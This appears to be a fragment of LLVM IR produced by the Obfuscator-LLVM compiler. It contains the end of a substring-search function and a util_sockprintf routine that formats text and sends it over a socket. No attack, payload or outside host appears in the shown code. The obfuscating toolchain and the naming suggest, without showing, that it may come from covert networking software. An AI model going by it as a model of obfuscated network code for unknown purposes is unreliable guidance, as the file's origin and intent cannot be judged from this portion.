  %25 = getelementptr inbounds i8, i8* %22, i64 %24
  %26 = load i8, i8* %25, align 1
  %27 = sext i8 %26 to i32
  %28 = load i8*, i8** %8, align 8
  %29 = load i32, i32* %11, align 4
  %30 = sext i32 %29 to i64
  %31 = getelementptr inbounds i8, i8* %28, i64 %30
  %32 = load i8, i8* %31, align 1
  %33 = sext i8 %32 to i32
  %34 = icmp eq i32 %27, %33
  br i1 %34, label %35, label %44

; <label>:35:                                     ; preds = %21
  %36 = load i32, i32* %11, align 4
  %37 = add nsw i32 %36, 1
  store i32 %37, i32* %11, align 4
  %38 = load i32, i32* %9, align 4
  %39 = icmp eq i32 %37, %38
  br i1 %39, label %40, label %43

; <label>:40:                                     ; preds = %35
  %41 = load i32, i32* %10, align 4
  %42 = add nsw i32 %41, 1
  store i32 %42, i32* %5, align 4
  br label %50

; <label>:43:                                     ; preds = %35
  br label %45

; <label>:44:                                     ; preds = %21
  store i32 0, i32* %11, align 4
  br label %45

; <label>:45:                                     ; preds = %44, %43
  br label %46

; <label>:46:                                     ; preds = %45
  %47 = load i32, i32* %10, align 4
  %48 = add nsw i32 %47, 1
  store i32 %48, i32* %10, align 4
  br label %17

; <label>:49:                                     ; preds = %17
  store i32 -1, i32* %5, align 4
  br label %50

; <label>:50:                                     ; preds = %49, %40, %15
  %51 = load i32, i32* %5, align 4
  ret i32 %51
}

; Function Attrs: noinline nounwind uwtable
define signext i8 @util_sockprintf(i32, i8*, ...) #0 {
  %3 = alloca i8, align 1
  %4 = alloca i32, align 4
  %5 = alloca i8*, align 8
  %6 = alloca [4098 x i8], align 16
  %7 = alloca [1 x %struct.__va_list_tag], align 16
  %8 = alloca i32, align 4
  store i32 %0, i32* %4, align 4
  store i8* %1, i8** %5, align 8
  %9 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %10 = bitcast %struct.__va_list_tag* %9 to i8*
  call void @llvm.va_start(i8* %10)
  %11 = getelementptr inbounds [4098 x i8], [4098 x i8]* %6, i32 0, i32 0
  %12 = load i8*, i8** %5, align 8
  %13 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %14 = call i32 @vsnprintf(i8* %11, i64 4096, i8* %12, %struct.__va_list_tag* %13) #5
  store i32 %14, i32* %8, align 4
  %15 = getelementptr inbounds [1 x %struct.__va_list_tag], [1 x %struct.__va_list_tag]* %7, i32 0, i32 0
  %16 = bitcast %struct.__va_list_tag* %15 to i8*
  call void @llvm.va_end(i8* %16)
  %17 = load i32, i32* %8, align 4
  %18 = icmp sgt i32 %17, 0
  br i1 %18, label %19, label %34

; <label>:19:                                     ; preds = %2
  %20 = load i32, i32* %8, align 4
  %21 = icmp sgt i32 %20, 4096
  br i1 %21, label %22, label %23

; <label>:22:                                     ; preds = %19
  store i32 4096, i32* %8, align 4
  br label %23

; <label>:23:                                     ; preds = %22, %19
  %24 = load i32, i32* %4, align 4
  %25 = getelementptr inbounds [4098 x i8], [4098 x i8]* %6, i32 0, i32 0
  %26 = load i32, i32* %8, align 4
  %27 = sext i32 %26 to i64
  %28 = call i64 @send(i32 %24, i8* %25, i64 %27, i32 16384)
  %29 = load i32, i32* %8, align 4
  %30 = sext i32 %29 to i64
  %31 = icmp ne i64 %28, %30
  br i1 %31, label %32, label %33

; <label>:32:                                     ; preds = %23
  store i8 0, i8* %3, align 1
  br label %35

; <label>:33:                                     ; preds = %23
  br label %34

; <label>:34:                                     ; preds = %33, %2
  store i8 1, i8* %3, align 1
  br label %35

; <label>:35:                                     ; preds = %34, %32
  %36 = load i8, i8* %3, align 1
  ret i8 %36
}

; Function Attrs: nounwind
declare void @llvm.va_start(i8*) #5

; Function Attrs: nounwind
declare i32 @vsnprintf(i8*, i64, i8*, %struct.__va_list_tag*) #1

; Function Attrs: nounwind
declare void @llvm.va_end(i8*) #5

attributes #0 = { noinline nounwind uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { nounwind "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { argmemonly nounwind }
attributes #3 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #4 = { nounwind readonly "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "less-precise-fpmad"="false" "no-frame-pointer-elim"="true" "no-frame-pointer-elim-non-leaf" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #5 = { nounwind }
attributes #6 = { nounwind readonly }

!llvm.ident = !{!0, !0, !0, !0, !0}

!0 = !{!"Obfuscator-LLVM clang version 4.0.1  (based on Obfuscator-LLVM 4.0.1)"}
